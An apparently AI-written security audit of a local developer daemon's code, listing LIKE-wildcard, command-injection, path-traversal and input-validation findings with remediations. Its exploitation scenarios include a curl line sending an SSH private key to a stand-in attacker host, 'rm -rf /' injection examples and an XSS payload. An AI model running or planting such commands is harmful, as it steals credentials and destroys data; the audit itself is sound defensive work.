I now have a comprehensive picture of the entire codebase. Let me compile the full audit report.

---

# Port Daddy Security Audit — Injection and Input Validation

This report covers all four attack surfaces requested. Findings are ordered by severity within each category.

---

## 1. SQL INJECTION

### FINDING SQL-1 — MEDIUM
**File:** `/Users/erichowens/coding/port-daddy/lib/activity.ts`, line 265

**Evidence:**
```typescript
} else if (targetPattern) {
  entries = stmts.getByTarget.all(targetPattern.replace(/\*/g, '%'), safeLimit) as ActivityRow[];
}
```

The `targetPattern` query parameter from `GET /activity?target=...` is passed directly into a `LIKE` clause after only replacing `*` with `%`. The SQL LIKE special characters `%` and `_` are not escaped beyond the wildcard substitution. More critically, the value is accepted raw from `req.query.target` in `routes/activity.ts` line 43 with no character allowlist validation:

```typescript
// routes/activity.ts line 43
targetPattern: target as string | undefined
```

**Exploitation Scenario:**
An attacker sends `GET /activity?target=_____:*` with underscores. Each `_` matches any single character in SQL LIKE, causing unexpected wildcard behavior. While this is not classical SQL injection because better-sqlite3 uses parameterized queries, it enables **LIKE wildcard injection** — the attacker can craft patterns that match far more records than intended, potentially causing a table-scan performance attack (DoS) or leaking records from unintended identity prefixes.

**Remediation:**
Escape `_` and `%` characters in the `targetPattern` before using them in the LIKE query, using the same `escapeLikePattern` function that already exists in `lib/agents.ts`:
```typescript
// Before substituting * -> %
const safePattern = targetPattern.replace(/[%_]/g, '\\$&').replace(/\*/g, '%');
```
Also add the same wildcard-pattern allowlist check (only alphanumeric, colon, dash, dot, asterisk) that services and locks use.

---

### FINDING SQL-2 — MEDIUM
**File:** `/Users/erichowens/coding/port-daddy/lib/dns.ts`, lines 301-303

**Evidence:**
```typescript
if (pattern) {
  const likePattern = pattern.replace(/\*/g, '%');
  records = stmts.listByPattern.all(likePattern, limit) as DnsRecordRow[];
}
```

The DNS `list()` function, called from `GET /dns?pattern=...` in `routes/dns.ts`, converts `*` to `%` but does not escape `_`. There is no input validation on the `pattern` query parameter before it enters the LIKE query. The `pattern` value is passed from `routes/dns.ts` line 55 without any sanitization or character allowlist:

```typescript
if (pattern) options.pattern = pattern as string;
```

**Exploitation Scenario:**
Same LIKE wildcard injection as SQL-1. An attacker can send `_` characters to match any single character, causing broad pattern matches that reveal all DNS records or perform a table scan. With a 100-record limit this is not catastrophic for data exposure, but it enables behavior the API does not intend to allow.

**Remediation:**
Escape SQL LIKE special characters before the substitution:
```typescript
const likePattern = pattern.replace(/[%_]/g, '\\$&').replace(/\*/g, '%');
```
Add a character allowlist for the pattern parameter in the DNS route, consistent with `IDENTITY_REGEX` used elsewhere.

---

### FINDING SQL-3 — LOW (Existing Defense Note)
**File:** `/Users/erichowens/coding/port-daddy/lib/agents.ts`, lines 445-459

**Evidence:**
```typescript
function escapeLikePattern(str: string): string {
  return str.replace(/[%_]/g, '\\$&');
}
// ...
const safeAgentId = escapeLikePattern(agentId);
const countResult = stmts.countServices.get(`%"agent":"${safeAgentId}"%`) as { count: number };
```

This is **correctly implemented** — the agent ID is escaped before embedding in a LIKE pattern. Noted as a positive pattern that SQL-1 and SQL-2 should replicate. However, it is worth documenting that this JSON-substring search pattern (`%"agent":"<id>"%`) is inherently fragile: it relies on exact JSON serialization format. A change in how metadata is serialized could silently break the count, allowing agents to bypass service limits.

**Remediation (Low priority):** Consider storing `agent_id` as a direct column on the `services` table rather than parsing it from a JSON blob via LIKE. This would be more robust and performant.

---

### OVERALL SQL INJECTION ASSESSMENT
The codebase is in good shape. All 30+ prepared statements reviewed use parameterized queries throughout (`?` placeholders, never string concatenation). The only SQL injection-class issues found are LIKE wildcard injection in two places, not classical first-order SQL injection.

---

## 2. COMMAND INJECTION

### FINDING CMD-1 — HIGH
**File:** `/Users/erichowens/coding/port-daddy/lib/orchestrator.ts`, lines 435-443

**Evidence:**
```typescript
const resolvedCmd = cmd.replace(/\$\{PORT\}/g, String(portMap[name] || ''));
const [shell, shellFlag] = process.platform === 'win32'
  ? ['cmd', '/c'] as const
  : ['sh', '-c'] as const;

const child = spawn(shell, [shellFlag, resolvedCmd], {
  cwd: svc.dir || process.cwd(),
  env: { ...process.env, ...env },
  stdio: ['ignore', 'pipe', 'pipe']
});
```

The `resolvedCmd` string is executed via `sh -c` (a shell). The command string originates from the `.portdaddyrc` configuration file's `cmd` or `dev` field, which is user-controlled. While this is an intentional design (service command execution), the `${PORT}` substitution uses `String(portMap[name] || '')` where `portMap[name]` is a numeric port from the daemon — this specific substitution is safe.

**However**, if the `svc.dir` (working directory) or any injected environment variable `env` values contain shell metacharacters, and if the command itself uses those variables unquoted in the shell expansion, shell injection is possible through the configuration file. More critically, the `cmd` field in `.portdaddyrc` is passed verbatim with no sanitization. A malicious or accidentally crafted `.portdaddyrc` file (e.g., committed to a shared repo) with a value like `npm start; rm -rf /` would execute both commands.

**Exploitation Scenario:**
Attacker contributes a `.portdaddyrc` with `"cmd": "echo hi; curl attacker.com/exfil?data=$(cat ~/.ssh/id_rsa | base64)"`. When `pd up` is run, the full shell string is executed.

**Severity Context:** This is intentional behavior for a developer tool — `pd up` is explicitly a service launcher. The severity is HIGH primarily because the threat vector (malicious `.portdaddyrc` in a shared repo) is realistic in a multi-agent/multi-contributor environment. At minimum, there should be a warning in the UI when commands contain shell metacharacters beyond the expected use (pipe, ampersand, semicolon outside quotes).

**Remediation:**
- Document the trust model explicitly: `.portdaddyrc` is treated as trusted configuration.
- Consider adding a pre-execution display of all commands about to be run with an interactive confirmation prompt when the `cmd` field contains shell metacharacters.
- For commands that do not require shell features, offer a `spawn` without shell mode using an array form (`cmd` as `string[]`) and bypass `sh -c`.

---

### FINDING CMD-2 — HIGH
**File:** `/Users/erichowens/coding/port-daddy/cli/commands/sugar.ts`, lines 354-358

**Evidence:**
```typescript
const useShell = !!options.shell;
const [cmd, ...cmdArgs] = command;
const child = spawn(cmd, cmdArgs, {
  stdio: 'inherit',
  shell: useShell,
});
```

The `pd with-lock <lock-name> <command...>` command spawns the user-provided `command` array using `spawn`. By default `shell: false`, which is the correct secure default. However, the `--shell` flag (`options.shell`) sets `shell: true`, which passes the entire command through the system shell.

**Exploitation Scenario:**
`pd with-lock mylock --shell "echo hello; rm -rf /"` — with `--shell`, the command array is joined and passed to `sh -c`, enabling injection of shell metacharacters. Since this is a CLI tool and the user is running the command directly, the typical risk is lower, but it becomes critical if `pd with-lock` is called programmatically from a script that constructs the command string from external input (e.g., a CI script that takes a pipeline step name from a config file or environment variable).

**Remediation:**
- Remove the `--shell` flag entirely. If users need shell features (pipes, &&), they can explicitly prefix: `pd with-lock mylock sh -c "cmd1 | cmd2"`.
- If `--shell` is kept, document prominently that it enables shell injection when combined with external input.

---

### FINDING CMD-3 — MEDIUM
**File:** `/Users/erichowens/coding/port-daddy/lib/tunnel.ts`, lines 62-64

**Evidence:**
```typescript
return new Promise(resolve => {
  const proc = spawn('which', [commands[provider]]);
  proc.on('close', code => resolve(code === 0));
});
```

The `commands[provider]` value is taken from a hardcoded dict (`ngrok`, `cloudflared`, `lt`) keyed by the `provider` input. The `provider` parameter is validated against `VALID_PROVIDERS = ['ngrok', 'cloudflared', 'localtunnel']` in `routes/tunnel.ts` before it reaches `tunnel.start()`. The `spawn('which', [arg])` call is safe from injection because `shell: false` is the default for `spawn`.

**However**, the tunnel `spawnTunnel()` function (not shown in my reading, referenced at line 104) spawns the tunnel provider binary. If the binary path is not absolute and relies on `PATH`, a path manipulation attack is theoretically possible on a compromised development machine. This is LOW in practice.

**Remediation (Low priority):** Use `which` to resolve the absolute path of the tunnel binary first, then spawn using the absolute path.

---

### FINDING CMD-4 — LOW
**File:** `/Users/erichowens/coding/port-daddy/lib/worktree.ts`, lines 33-72

**Evidence:**
```typescript
const root = execSync('git rev-parse --show-toplevel', opts).toString().trim();
const commonDir = execSync('git rev-parse --git-common-dir', opts).toString().trim();
```

These `execSync` calls run fixed git commands with a controlled `cwd` option. The commands themselves are hardcoded strings with no user input. These are not injectable. Noted as safe.

---

### FINDING CMD-5 — LOW
**File:** `/Users/erichowens/coding/port-daddy/cli/commands/tutorial.ts`, line 312

**Evidence:**
```typescript
execFile(openCmd, [dashUrl], (err) => {
```

The `dashUrl` is derived from `PORT_DADDY_URL` environment variable (a fixed string like `http://localhost:9876/`) and `openCmd` is `'open'` (macOS) or `'xdg-open'` (Linux) — both hardcoded. No user input reaches these arguments. `execFile` is used (not `exec`), which does not invoke a shell. This is safe. Noted as a positive pattern.

---

## 3. PATH TRAVERSAL

### FINDING PT-1 — CRITICAL
**File:** `/Users/erichowens/coding/port-daddy/routes/briefing.ts`, lines 40-53 and `/Users/erichowens/coding/port-daddy/lib/briefing.ts`, lines 447-480

**Evidence in route:**
```typescript
router.post('/briefing', (req: Request, res: Response): void => {
  const { projectRoot, project, full } = req.body as { projectRoot?: string; ... };

  if (!projectRoot || typeof projectRoot !== 'string') {
    res.status(400).json({ success: false, error: 'projectRoot is required' });
    return;
  }

  // ... immediately passed to briefing.generate(projectRoot, ...)
```

**Evidence in lib/briefing.ts:**
```typescript
function generate(projectRoot: string, options: ...): GenerateResult {
  const resolvedRoot = resolve(projectRoot);
  // ...
  const pdDir = ensureDir(resolvedRoot);
  // ...
  writeFileSync(mdPath, md);       // writes briefing.md
  writeFileSync(jsonPath, JSON.stringify(data, null, 2));  // writes briefing.json
```

The `POST /briefing` endpoint accepts an arbitrary `projectRoot` string from the HTTP request body, resolves it with `resolve()` (which canonicalizes `..` sequences), and then **writes files to the filesystem at that location** — specifically creating a `.portdaddy/` directory and writing `briefing.md` and `briefing.json` into it.

**Exploitation Scenario:**
An attacker (or rogue agent) sends:
```json
POST /briefing
{"projectRoot": "/etc"}
```
This causes Port Daddy to:
1. Create `/etc/.portdaddy/` (if writable)
2. Write `/etc/.portdaddy/briefing.md` containing notes, session contents, file paths, agent identities, and recent activity log data (information disclosure)
3. Write `/etc/.portdaddy/briefing.json` with the same data as structured JSON

With `{"projectRoot": "/", "full": true}` and a `sync` call, it also writes an `activity.log` containing all daemon activity.

Even more dangerous: with `{"projectRoot": "/home/user/.ssh"}`, a `.portdaddy/` directory is created there. Depending on SSH config, this creates unexpected directories in sensitive locations.

Since Port Daddy is a local daemon (localhost:9876) and the CLAUDE.md notes it lacks authentication on the HTTP interface, **any process on the machine can perform this write** — including malicious npm scripts, browser extensions connecting to localhost, etc.

**Remediation:**
1. **Require explicit path allowlisting**: Only allow `projectRoot` values that are subdirectories of a pre-configured project root, or that exist in the registered projects table.
2. At minimum, reject paths that resolve to system directories: `/etc`, `/usr`, `/var`, `/root`, `/home/<user>/.ssh`, `/home/<user>/.gnupg`, etc.
3. Consider removing `projectRoot` as a POST body parameter entirely and instead requiring it be a registered project ID that maps to a known root.

---

### FINDING PT-2 — HIGH
**File:** `/Users/erichowens/coding/port-daddy/routes/briefing.ts`, line 77

**Evidence:**
```typescript
router.get('/briefing/:project', (req: Request, res: Response): void => {
  const { project } = req.params;
  const projectRoot = (req.query.projectRoot as string) || process.cwd();

  try {
    const result = briefing.generate(projectRoot, { project: project as string, writeToDisk: false });
```

The `GET /briefing/:project` endpoint also accepts a `projectRoot` query parameter and passes it to `briefing.generate()`. While `writeToDisk` defaults to `false` here (so no files are written), the `generate()` function still calls `gatherData()` which calls `loadConfig(resolvedRoot)` — reading from `resolvedRoot/.portdaddyrc`. An attacker can probe arbitrary filesystem paths:

```
GET /briefing/myproject?projectRoot=/etc/passwd
GET /briefing/myproject?projectRoot=/root
```

The config loading will attempt to read `readFileSync(join(resolvedRoot, '.portdaddyrc'), 'utf8')` — this is a controlled read to a fixed filename, not a full directory traversal. But it reveals whether the path exists and is readable (via error or non-error response). This is an information disclosure vulnerability.

**Remediation:**
Apply the same path allowlisting as PT-1.

---

### FINDING PT-3 — MEDIUM
**File:** `/Users/erichowens/coding/port-daddy/cli/commands/sugar.ts`, lines 30-41

**Evidence:**
```typescript
function getContextDir(): string {
  return join(process.cwd(), '.portdaddy');
}

function getContextPath(): string {
  return join(getContextDir(), 'current.json');
}

function writeContext(ctx: CurrentContext): void {
  const dir = getContextDir();
  if (!existsSync(dir)) mkdirSync(dir, { recursive: true });
  writeFileSync(getContextPath(), JSON.stringify(ctx, null, 2));
}
```

The context file is written to `process.cwd()/.portdaddy/current.json`. The `cwd()` is determined at CLI runtime, which is caller-controlled. If a user runs `pd begin` from a sensitive directory (e.g., `/etc`, `/root/.ssh`), this creates `.portdaddy/current.json` there. However, this requires the attacker to control where the CLI is executed from — a weaker threat model than the network-accessible PT-1.

**Remediation:**
Consider writing the context file to a fixed location (e.g., `~/.portdaddy/current-<pid>.json` or a project-specific path based on git root detection) rather than arbitrary `cwd()`.

---

### FINDING PT-4 — MEDIUM
**File:** `/Users/erichowens/coding/port-daddy/lib/briefing.ts`, lines 549-562

**Evidence:**
```typescript
function archiveSession(projectRoot: string, sessionId: string): string | null {
  // ...
  const filePath = join(pdDir, 'sessions', `${sessionId}.md`);
  writeFileSync(filePath, md);
  return filePath;
}
```

The `sessionId` is used directly in a filename without sanitization. Session IDs are generated as `'session-' + randomBytes(4).toString('hex')` (hex characters only), so in practice they are safe. However, the `archiveSession` function is also exposed as a public API method. If a future code path allows arbitrary session IDs (e.g., user-supplied IDs) to be passed here, the `sessionId` in the filename could contain path separators.

**Current Risk:** Low, because session IDs are generated internally. The pattern is noted for future hardening.

**Remediation:**
Add an explicit check: `if (!/^[a-zA-Z0-9_-]+$/.test(sessionId)) return null;` before using sessionId in a filename.

---

## 4. INPUT VALIDATION

### FINDING IV-1 — HIGH
**File:** `/Users/erichowens/coding/port-daddy/routes/sessions.ts`, lines 88-141 (POST /sessions)

**Evidence:**
```typescript
const { purpose, agentId, files, force, metadata } = req.body;

if (!purpose || typeof purpose !== 'string') { ... }

// agentId, files, force, metadata passed to sessions.start() with NO route-level validation
const result = sessions.start(purpose, { agentId, files, metadata });
```

The `agentId` field is accepted from the request body and passed to `sessions.start()` without validation in the route handler. The module-level validation in `lib/sessions.ts` line 415 checks `typeof agentId !== 'string'` but does not enforce a character allowlist or length limit on the agent ID. This means any string up to JavaScript's string limit can be stored as `agent_id` in the `sessions` table.

**Contrast:** The `POST /agents` route correctly calls `validateAgentId(id)` before storing. But when creating a session, the `agentId` link to an agent is not validated — an arbitrary string can be inserted as `agent_id`.

**Exploitation Scenario:**
- Store a 10MB string as `agentId` in a session, causing bloat in the SQLite database.
- Inject a string that looks like a real agent ID to confuse monitoring/salvage logic, e.g., `agentId: "agent-0000\nsomething"` with newline characters.

**Remediation:**
Add `validateAgentId(agentId)` check in the `POST /sessions` route before calling `sessions.start()`, consistent with how agents are validated on registration.

---

### FINDING IV-2 — HIGH
**File:** `/Users/erichowens/coding/port-daddy/routes/sessions.ts`, lines 388-442 (POST /sessions/:id/files)

**Evidence:**
```typescript
const { files, force } = req.body;

if (!files || !Array.isArray(files) || files.length === 0) {
  return res.status(400).json({ ... });
}
// ... no validation on individual file path values
const result = sessions.claimFiles(sessionId, files);
```

File paths submitted to `POST /sessions/:id/files` are only checked to be a non-empty array. Individual elements are validated in `lib/sessions.ts` line 707 as "non-empty strings" but there is no path validation — no check for path traversal sequences, no length limit, no character allowlist. File paths like `../../../../etc/passwd` or `<script>alert(1)</script>` are stored verbatim in the `session_files` table.

While the file claim system is advisory (it doesn't actually open files), these values are returned in API responses and rendered in the dashboard at `public/index.html`. Stored XSS in the dashboard is possible if the dashboard renders file paths without HTML encoding (see Finding IV-7 below).

**Remediation:**
- Enforce a maximum file path length (e.g., 512 characters).
- Consider normalizing paths using `path.normalize()` and rejecting paths that would escape a project root.
- At minimum, reject null bytes: `if (filePath.includes('\0')) reject`.

---

### FINDING IV-3 — MEDIUM
**File:** `/Users/erichowens/coding/port-daddy/routes/sugar.ts`, lines 32-72 (POST /sugar/begin)

**Evidence:**
```typescript
const { purpose, identity, agentId, type, files, force, metadata } = req.body;

if (!purpose || typeof purpose !== 'string') { ... }

// agentId: no validation before sugar.begin()
// type: no validation (any string accepted)
// files: no individual validation
// metadata: no size validation
const result = sugar.begin({ purpose, identity, agentId, type, files, force, metadata });
```

The `/sugar/begin` route accepts `agentId`, `type`, `files`, and `metadata` without applying the validators from `shared/validators.js`. The `identity` field is validated inside `lib/agents.ts:register()` via `parseIdentity()`, but `agentId`, `type`, and `files` are not validated at the route level.

**Exploitation Scenario:**
- `type` can be any arbitrary string stored in the `agents` table `type` column.
- `metadata` could be a multi-megabyte object (no size check in the sugar route), stored in SQLite and returned in responses.

**Remediation:**
Add validation in the route: `validateAgentId(agentId)`, `validateMetadata(metadata)`, and a type allowlist (e.g., `['cli', 'mcp', 'api']`).

---

### FINDING IV-4 — MEDIUM
**File:** `/Users/erichowens/coding/port-daddy/routes/sessions.ts`, lines 578-597 (GET /notes)

**Evidence:**
```typescript
const limitParam = req.query.limit;
const typeParam = req.query.type;
const sinceParam = req.query.since;

const limit = typeof limitParam === 'string' ? parseInt(limitParam, 10) : 50;
const type = typeof typeParam === 'string' ? typeParam : undefined;
const since = typeof sinceParam === 'string' ? parseInt(sinceParam, 10) : undefined;
```

The `type` parameter in `GET /notes?type=...` is passed as an unvalidated string to `sessions.getNotes()`, which uses it in a prepared statement:
```sql
SELECT ... WHERE sn.type = ?
```
While this is a parameterized query (safe from SQL injection), the `type` value is stored when notes are created and can be any arbitrary string. There is no type allowlist. A note type like `<img src=x onerror=fetch('...')>` would be stored and returned in API responses, with XSS risk if rendered in the dashboard without escaping.

**Remediation:**
Define a `NOTE_TYPE` allowlist (e.g., `['note', 'progress', 'handoff', 'warning', 'error']`) and validate the `type` field in both the `POST /notes` handler (for creation) and the `GET /notes` handler (for filtering).

---

### FINDING IV-5 — MEDIUM
**File:** `/Users/erichowens/coding/port-daddy/routes/agents.ts`, lines 244-280 (POST /agents/:id/inbox)

**Evidence:**
```typescript
const agentId = req.params.id as string;
const { content, from, type } = req.body;

if (!content) {
  return res.status(400).json({ error: 'content required' });
}

// No validation on:
// - content length (could be megabytes)
// - 'from' field (any string)
// - 'type' field (any string)
const result = agentInbox.send(agentId, content, { from, type });
```

The agent inbox send endpoint accepts `content`, `from`, and `type` with no size limits or character validation. An attacker can send megabyte-sized messages to any registered agent's inbox, causing database bloat and potential memory pressure when the inbox is read.

**Remediation:**
- Enforce a `content` maximum length (e.g., 65535 characters).
- Validate `from` as a valid agent ID format.
- Validate `type` against an allowlist.

---

### FINDING IV-6 — MEDIUM
**File:** `/Users/erichowens/coding/port-daddy/routes/activity.ts`, lines 35-53 (GET /activity)

**Evidence:**
```typescript
const { limit, type, agent, target } = req.query;

const result = activityLog.getRecent({
  limit: limit ? parseInt(limit as string, 10) : 100,
  type: type as string | undefined,
  agentId: agent as string | undefined,
  targetPattern: target as string | undefined
});
```

None of the four query parameters are validated:
- `limit`: `parseInt` without range check — sending `limit=999999` causes 999999 rows to be fetched (capped at 1000 inside `getRecent` — this defense exists in the module but not the route).
- `type`: any arbitrary string used as an exact-match filter — no allowlist.
- `agent`: any string used as `agent_id = ?` — no format validation.
- `target`: LIKE wildcard injection (see SQL-1).

**Remediation:**
Add explicit validation: cap `limit` to 1000 at the route layer; validate `type` against the `ActivityType` enum; validate `agent` format with `validateAgentId`.

---

### FINDING IV-7 — MEDIUM
**File:** `/Users/erichowens/coding/port-daddy/routes/sessions.ts`, lines 446-465 (DELETE /sessions/:id/files)

**Evidence:**
```typescript
let files: string[];
const pathsParam = req.query.paths;
if (pathsParam && typeof pathsParam === 'string') {
  files = pathsParam.split(',');
} else if (req.body.files && Array.isArray(req.body.files)) {
  files = req.body.files;
} else {
  return res.status(400).json({ ... });
}

const result = sessions.releaseFiles(sessionId, files);
```

When file release paths are provided via query string (`?paths=file1,file2`), they are split on comma and used as-is. Paths containing commas are mishandled. More importantly, this accepts an unlimited number of paths (split from a potentially very long query string) with no count limit.

**Remediation:**
Add a maximum file count check (e.g., `if (files.length > 100) reject`) and apply the same path validation that should be applied to file claims.

---

### FINDING IV-8 — LOW
**File:** `/Users/erichowens/coding/port-daddy/routes/sessions.ts`, line 157

**Evidence:**
```typescript
const limit = typeof limitParam === 'string' ? parseInt(limitParam, 10) : 50;

const result = sessions.list({ status, agentId, worktreeId, allWorktrees, includeNotes, limit });
```

The `limit` parameter from `GET /sessions?limit=...` is parsed with `parseInt` but not bounds-checked at the route layer before passing to `sessions.list()`. The module defaults `limit = 50` but accepts any caller-supplied value. Sending `limit=0` results in `LIMIT 0` (empty results, probably benign) and `limit=-1` or `limit=NaN` may cause unexpected SQLite behavior depending on the prepared statement behavior with those values.

**Remediation:**
Clamp limit at the route layer: `const limit = Math.max(1, Math.min(parseInt(...) || 50, 500))`.

---

### FINDING IV-9 — LOW
**File:** `/Users/erichowens/coding/port-daddy/routes/sessions.ts`, lines 196-207 (PUT /sessions/:id)

**Evidence:**
```typescript
const { status, note } = req.body;

let result: Record<string, unknown>;

if (status === 'abandoned') {
  result = sessions.abandon(sessionId);
} else {
  result = sessions.end(sessionId, { note, status });
}
```

The `status` field in `PUT /sessions/:id` has no validation against an allowlist. While `lib/sessions.ts:end()` accepts any status string and stores it in the `sessions.status` column, the valid values should only be `'completed'` and `'abandoned'`. Any arbitrary string can be stored in the status column (e.g., `"<script>"`), which could affect dashboard rendering.

**Contrast:** The sugar route `/sugar/done` correctly validates `status` against `new Set(['completed', 'abandoned'])` (routes/sugar.ts line 82). This same protection is missing from the direct sessions endpoint.

**Remediation:**
Add `const VALID_SESSION_STATUSES = new Set(['completed', 'abandoned']); if (status && !VALID_SESSION_STATUSES.has(status)) return 400`.

---

## SUMMARY TABLE

| ID | Category | Severity | File | Finding |
|----|----------|----------|------|---------|
| PT-1 | Path Traversal | CRITICAL | `routes/briefing.ts` | Arbitrary filesystem write via user-controlled `projectRoot` |
| CMD-1 | Command Injection | HIGH | `lib/orchestrator.ts` | `sh -c` execution of `.portdaddyrc` cmd field (intentional but undocumented trust boundary) |
| CMD-2 | Command Injection | HIGH | `cli/commands/sugar.ts` | `--shell` flag enables shell injection in `pd with-lock` |
| IV-1 | Input Validation | HIGH | `routes/sessions.ts` | `agentId` in POST /sessions not validated against allowlist |
| IV-2 | Input Validation | HIGH | `routes/sessions.ts` | File paths in file claims not validated (length, traversal, XSS storage) |
| PT-2 | Path Traversal | HIGH | `routes/briefing.ts` | Arbitrary path probe via `projectRoot` query param on GET /briefing |
| SQL-1 | LIKE Wildcard Injection | MEDIUM | `lib/activity.ts` | `_` not escaped in `targetPattern` LIKE query |
| SQL-2 | LIKE Wildcard Injection | MEDIUM | `lib/dns.ts` | `_` not escaped in DNS list pattern LIKE query |
| CMD-3 | Command Injection | MEDIUM | `lib/tunnel.ts` | Tunnel binary spawned from PATH (path manipulation) |
| IV-3 | Input Validation | MEDIUM | `routes/sugar.ts` | `agentId`, `type`, `metadata` not validated on POST /sugar/begin |
| IV-4 | Input Validation | MEDIUM | `routes/sessions.ts` | Note `type` field accepts arbitrary strings (stored XSS risk) |
| IV-5 | Input Validation | MEDIUM | `routes/agents.ts` | No size/format validation on inbox message `content`, `from`, `type` |
| IV-6 | Input Validation | MEDIUM | `routes/activity.ts` | No validation on `limit`, `type`, `agent` query params for activity log |
| IV-7 | Input Validation | MEDIUM | `routes/sessions.ts` | File release via query string has no count limit |
| PT-3 | Path Traversal | MEDIUM | `cli/commands/sugar.ts` | Context file written to arbitrary `cwd()` |
| IV-8 | Input Validation | LOW | `routes/sessions.ts` | `limit` param not bounded at route layer |
| IV-9 | Input Validation | LOW | `routes/sessions.ts` | `status` field in PUT /sessions not validated against allowlist |
| PT-4 | Path Traversal | LOW | `lib/briefing.ts` | `sessionId` used in filename without sanitization (currently safe) |
| SQL-3 | SQLite Pattern | LOW | `lib/agents.ts` | JSON-substring LIKE for service counting is fragile (not a vuln, design note) |
| CMD-4 | Command Injection | LOW | `lib/worktree.ts` | `execSync` git commands — safe (hardcoded args) |
| CMD-5 | Command Injection | LOW | `cli/commands/tutorial.ts` | `execFile` for browser open — safe (hardcoded args, execFile not exec) |

## TOP PRIORITY REMEDIATIONS

1. **PT-1 (CRITICAL):** The `POST /briefing` endpoint writes files to a caller-controlled path. Add a project root allowlist before any filesystem write. This is the most dangerous finding — it is network-accessible (localhost) and requires no authentication.

2. **CMD-1 (HIGH):** Document that `.portdaddyrc` `cmd` fields are executed as shell commands with full system access. Add a pre-execution warning when metacharacters are detected.

3. **CMD-2 (HIGH):** Remove or strongly document the `--shell` flag on `pd with-lock`. It defeats the otherwise-safe `spawn` with `shell: false` default.

4. **IV-2 (HIGH):** File path claims have no validation. Add length limits and reject null bytes at minimum.

5. **SQL-1 + SQL-2 (MEDIUM):** Escape SQL LIKE wildcards in both `lib/activity.ts` and `lib/dns.ts`. Use the `escapeLikePattern()` function already present in `lib/agents.ts`.
